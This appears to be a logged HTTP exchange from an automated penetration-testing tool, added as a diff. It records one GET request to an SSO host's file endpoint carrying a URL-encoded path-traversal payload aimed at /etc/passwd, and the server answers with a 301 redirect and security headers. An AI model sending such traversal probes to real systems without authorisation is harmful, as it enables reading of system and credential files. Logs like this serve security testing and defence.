@@ -1,0 +1,29 @@
+REQUEST:
+GET https://sso.baliprov.dev/file?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+User-Agent: pentest-ai/1.6.2 (compatible; rv:a2cfe36ea2c0; +https://pentestai.xyz)
+X-Request-ID: 7a3f9c21-4b08-4e11-9c02-a2cfe36ea2c0
+
+
+
+RESPONSE:
+HTTP 301
+Date: Tue, 24 Nov 2026 23:50:21 GMT
+Content-Type: text/html
+Content-Length: 162
+Connection: keep-alive
+Location: http://sso.baliprov.dev/file/?path=../../../../etc/passwd
+X-Frame-Options: SAMEORIGIN
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Content-Security-Policy: upgrade-insecure-requests; default-src 'self' https: data: blob:; script-src 'self' https: 'unsafe-inline' 'unsafe-eval'; style-src 'self' https: https://cdn.datatables.net https://cdnjs.cloudflare.com https://fonts.googleapis.com https://stackpath.bootstrapcdn.com 'unsafe-inline'; style-src-elem 'self' https: https://cdn.datatables.net https://cdnjs.cloudflare.com https://fonts.googleapis.com https://stackpath.bootstrapcdn.com 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https: data: https://fonts.gstatic.com; connect-src 'self' https:; object-src 'none'; frame-ancestors 'self'; base-uri 'self';
+Referrer-Policy: no-referrer
+Permissions-Policy: camera=(self)
+
+<html>
+<head><title>301 Moved Permanently</title></head>
+<body>
+<center><h1>301 Moved Permanently</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
